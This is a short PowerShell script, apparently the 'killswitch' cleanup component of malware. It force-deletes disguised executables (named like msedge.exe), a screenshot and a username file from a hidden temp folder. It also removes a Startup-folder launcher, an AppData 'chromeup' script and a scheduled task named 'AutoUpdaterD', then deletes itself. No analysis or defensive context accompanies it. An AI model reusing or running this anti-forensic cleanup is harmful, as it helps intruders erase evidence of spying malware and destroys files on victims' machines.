Start-Sleep 10
Remove-Item $env:temp\sVBXKuz\wsappa.exe -Force
Remove-Item $env:temp\sVBXKuz\msedge.exe -Force
Remove-Item $env:temp\sVBXKuz\microsoft_edge.exe -Force
Remove-Item $env:temp\sVBXKuz\libsodium.dll -Force
Remove-Item $env:temp\sVBXKuz\libopus.dll -Force
Remove-Item $env:temp\sVBXKuz\screenshot.png -Force

$folderPath = "$env:temp/sVBXKuz/"
Set-ItemProperty -Path $folderPath -Name Attributes -Value ([IO.FileAttributes]::Normal)
cd..
Remove-Item $env:temp\sVBXKuz -Recurse -Force
Remove-Item $env:temp\username.json

Remove-Item $env:appdata\chromeup\backup.ps1 -Force
Remove-Item $env:appdata\chromeup -Recurse -Force
Remove-Item $env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd


Unregister-ScheduledTask -TaskName "AutoUpdaterD" -Confirm:$false
powershell.exe /c Remove-Item $env:temp/killswitch.ps1;Remove-Item $env:temp\sVBXKuz -Force
